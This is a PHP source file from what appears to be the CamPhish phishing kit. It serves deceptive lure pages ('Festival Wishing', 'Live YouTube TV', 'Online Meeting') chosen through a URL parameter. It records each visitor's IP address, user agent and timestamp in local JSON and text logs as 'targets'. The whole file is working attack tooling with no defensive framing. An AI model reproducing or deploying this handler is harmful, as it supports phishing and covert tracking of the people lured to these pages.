<?php
// CamPhish Multi-Template Handler
// Detects which template was selected and loads appropriate content

$template = isset($_GET['template']) ? sanitize($_GET['template']) : 'default';
$action = isset($_GET['action']) ? $_GET['action'] : '';

// Log incoming requests
$ip = get_client_ip();
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$timestamp = date('Y-m-d H:i:s');

log_target($ip, $user_agent, $timestamp, $action);

function sanitize($input) {
    return htmlspecialchars(strip_tags($input), ENT_QUOTES, 'UTF-8');
}

function get_client_ip() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    } else {
        $ip = 'UNKNOWN';
    }
    return trim($ip);
}

function log_target($ip, $ua, $timestamp, $action = '') {
    $log_data = [
        'timestamp' => $timestamp,
        'ip' => $ip,
        'user_agent' => $ua,
        'action' => $action,
        'template' => isset($_GET['template']) ? $_GET['template'] : 'default'
    ];
    
    // Append to JSON log
    $json_file = dirname(__FILE__) . '/ip.json';
    $existing = [];
    if (file_exists($json_file)) {
        $json_content = file_get_contents($json_file);
        if (!empty($json_content)) {
            $existing = json_decode($json_content, true) ?? [];
        }
    }
    $existing[] = $log_data;
    file_put_contents($json_file, json_encode($existing, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    
    // Append to text log
    $txt_file = dirname(__FILE__) . '/ip.txt';
    $log_line = "[$timestamp] IP: $ip | Template: {$log_data['template']} | Action: $action\n";
    file_put_contents($txt_file, $log_line, FILE_APPEND);
}

// Detect which template to serve
$festival_keywords = ['festival', 'wishing', 'wish'];
$youtube_keywords = ['youtube', 'live', 'tv', 'stream'];
$meeting_keywords = ['meeting', 'online', 'zoom', 'video'];

// If template passed via GET
if ($template && $template !== 'default') {
    $template_lower = strtolower($template);
    if (in_array($template_lower, $festival_keywords) || strpos($template_lower, 'festival') !== false) {
        $template = 'festival';
    } elseif (in_array($template_lower, $youtube_keywords) || strpos($template_lower, 'youtube') !== false) {
        $template = 'youtube';
    } elseif (in_array($template_lower, $meeting_keywords) || strpos($template_lower, 'meeting') !== false) {
        $template = 'meeting';
    }
}

// Route to appropriate template file
$template_file = '';
$available_templates = [
    'festival' => 'festivalwishes.html',
    'youtube' => 'LiveYTTV.html',
    'meeting' => 'OnlineMeeting.html',
    'default' => 'festivalwishes.html'
];

$template_to_use = $template && isset($available_templates[$template]) ? $template : 'festival';
$template_file = dirname(__FILE__) . '/' . $available_templates[$template_to_use];

// Check if template file exists, serve it
if (file_exists($template_file)) {
    // Log access with template name
    log_target($ip, $user_agent, $timestamp, "PAGE_VIEW_" . strtoupper($template_to_use));
    
    // Serve template content
    readfile($template_file);
    exit;
}

// Fallback if template not found
?>
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="utf-8">
</head>
<body style="background: #000; color: #fff; font-family: Arial; text-align: center; padding-top: 100px;">
    <h1>Template Not Found</h1>
    <p>The requested template is not available.</p>
    <p><a href="?template=festival" style="color: #0f0;">Festival Wishing</a></p>
    <p><a href="?template=youtube" style="color: #0f0;">Live YouTube TV</a></p>
    <p><a href="?template=meeting" style="color: #0f0;">Online Meeting</a></p>
</body>
</html>
